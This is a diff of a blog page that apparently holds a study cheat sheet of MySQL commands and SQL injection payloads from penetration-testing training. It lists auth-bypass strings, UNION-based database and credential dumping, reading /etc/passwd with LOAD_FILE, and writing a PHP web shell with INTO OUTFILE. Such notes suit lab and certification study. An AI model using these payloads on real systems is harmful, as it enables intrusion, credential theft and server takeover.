@@ -11,7 +11,7 @@
   
   <title>
     
-      Tags 
+      MYSQL基本用法 
       
       
       |
@@ -136,21 +136,348 @@
 
 
 
-  <!-- 标签页 url形式：https://yoursite/tags/ -->
-  <div class="container tag-index">
-    <div>
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bash/" rel="tag">Bash</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali-Tools/" rel="tag">Kali Tools</a><span class="tag-list-count">9</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OSCP%E5%AD%A6%E4%B9%A0/" rel="tag">OSCP学习</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/" rel="tag">SQL</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" rel="tag">逻辑漏洞</a><span class="tag-list-count">1</span></li></ul>
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">MYSQL基本用法</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-10-20 16:29:33
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/WEB%E5%AE%89%E5%85%A8/" title="WEB安全">
+                    #WEB安全
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/SQL/" title="SQL">
+                    #SQL
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>General</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code></td>
+<td>login to mysql database</td>
+</tr>
+<tr>
+<td><code>SHOW DATABASES</code></td>
+<td>List available databases</td>
+</tr>
+<tr>
+<td><code>USE users</code></td>
+<td>Switch to database</td>
+</tr>
+<tr>
+<td><strong>Tables</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>CREATE TABLE logins (id INT, ...)</code></td>
+<td>Add a new table</td>
+</tr>
+<tr>
+<td><code>SHOW TABLES</code></td>
+<td>List available tables in current database</td>
+</tr>
+<tr>
+<td><code>DESCRIBE logins</code></td>
+<td>Show table properties and columns</td>
+</tr>
+<tr>
+<td><code>INSERT INTO table_name VALUES (value_1,..)</code></td>
+<td>Add values to table</td>
+</tr>
+<tr>
+<td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td>
+<td>Add values to specific columns in a table</td>
+</tr>
+<tr>
+<td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code></td>
+<td>Update table values</td>
+</tr>
+<tr>
+<td><strong>Columns</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>SELECT * FROM table_name</code></td>
+<td>Show all columns in a table</td>
+</tr>
+<tr>
+<td><code>SELECT column1, column2 FROM table_name</code></td>
+<td>Show specific columns in a table</td>
+</tr>
+<tr>
+<td><code>DROP TABLE logins</code></td>
+<td>Delete a table</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins ADD newColumn INT</code></td>
+<td>Add new column</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td>
+<td>Rename column</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td>
+<td>Change column datatype</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins DROP oldColumn</code></td>
+<td>Delete column</td>
+</tr>
+<tr>
+<td><strong>Output</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1</code></td>
+<td>Sort by column</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td>
+<td>Sort by column in descending order</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td>
+<td>Sort by two-columns</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins LIMIT 2</code></td>
+<td>Only show first two results</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins LIMIT 1, 2</code></td>
+<td>Only show first two results starting from index 2</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></td>
+<td>List results that meet a condition</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins WHERE username LIKE &#39;admin%&#39;</code></td>
+<td>List results where the name is similar to a given string</td>
+</tr>
+</tbody></table>
+<h2 id="MySQL-Operator-Precedence"><a href="#MySQL-Operator-Precedence" class="headerlink" title="MySQL Operator Precedence"></a>MySQL Operator Precedence</h2><ul>
+<li>Division (<code>/</code>), Multiplication (<code>*</code>), and Modulus (<code>%</code>)</li>
+<li>Addition (<code>+</code>) and Subtraction (<code>-</code>)</li>
+<li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>, <code>LIKE</code>)</li>
+<li>NOT (<code>!</code>)</li>
+<li>AND (<code>&amp;&amp;</code>)</li>
+<li>OR (<code>||</code>)</li>
+</ul>
+<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><table>
+<thead>
+<tr>
+<th><strong>Payload</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Auth Bypass</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>admin&#39; or &#39;1&#39;=&#39;1</code></td>
+<td>Basic Auth Bypass</td>
+</tr>
+<tr>
+<td><code>admin&#39;)-- -</code></td>
+<td>Basic Auth Bypass With comments</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Auth Bypass Payloads</a></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Union Injection</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>&#39; order by 1-- -</code></td>
+<td>Detect number of columns using <code>order by</code></td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,2,3-- -</code></td>
+<td>Detect number of columns using Union injection</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,@@version,3,4-- -</code></td>
+<td>Basic Union injection</td>
+</tr>
+<tr>
+<td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td>
+<td>Union injection for 4 columns</td>
+</tr>
+<tr>
+<td><strong>DB Enumeration</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>SELECT @@version</code></td>
+<td>Fingerprint MySQL with query output</td>
+</tr>
+<tr>
+<td><code>SELECT SLEEP(5)</code></td>
+<td>Fingerprint MySQL with no output</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,database(),2,3-- -</code></td>
+<td>Current database name</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td>
+<td>List all databases</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- -</code></td>
+<td>List all tables in a specific database</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;credentials&#39;-- -</code></td>
+<td>List all columns in a specific table</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1, username, password, 4 from dev.credentials-- -</code></td>
+<td>Dump data from a table in another database</td>
+</tr>
+<tr>
+<td><strong>Privileges</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION SELECT 1, user(), 3, 4-- -</code></td>
+<td>Find current user</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -</code></td>
+<td>Find if user has admin privileges</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- -</code></td>
+<td>Find if all user privileges</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</code></td>
+<td>Find which directories can be accessed through MySQL</td>
+</tr>
+<tr>
+<td><strong>File Injection</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</code></td>
+<td>Read local file</td>
+</tr>
+<tr>
+<td><code>select &#39;file written successfully!&#39; into outfile &#39;/var/www/html/proof.txt&#39;</code></td>
+<td>Write a string to a local file</td>
+</tr>
+<tr>
+<td><code>cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -</code></td>
+<td>Write a web shell into the base web directory</td>
+</tr>
+</tbody></table>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/10/20/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E8%B6%8A%E6%9D%83(%E8%B6%8A%E6%9D%83)/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-10-20 16:29:33
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/WEB%E5%AE%89%E5%85%A8/" title="WEB安全">
+                        #WEB安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/SQL/" title="SQL">
+                        #SQL
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/10/20/Kali-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL"><span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-Operator-Precedence"><span class="toc-text">MySQL Operator Precedence</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection"><span class="toc-text">SQL Injection</span></a></li></ol>
+      
     </div>
   </div>
-  
 
   
+<script src="/js/catalog.js"></script>
 
-  
 
-  
 
-  
+
+    
+  </div>
+
 
         
 <div class="footer">
@@ -412,12 +739,12 @@
       </a>
       <div class="share-content hidden">
         
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Tags + '&url=' + http%3A%2F%2Fexample.com%2Ftags%2Findex.html + '" target="_blank" title="Twitter">
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + MYSQL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95 + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F10%2F20%2FMYSQL%25E5%259F%25BA%25E6%259C%25AC%25E7%2594%25A8%25E6%25B3%2595%2F + '" target="_blank" title="Twitter">
             <i class="iconfont icon-twitter"></i>
           </a>
         
         
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/tags/index.html" target="_blank" title="Facebook">
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/10/20/MYSQL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/" target="_blank" title="Facebook">
             <i class="iconfont icon-facebooksquare"></i>
           </a>
         
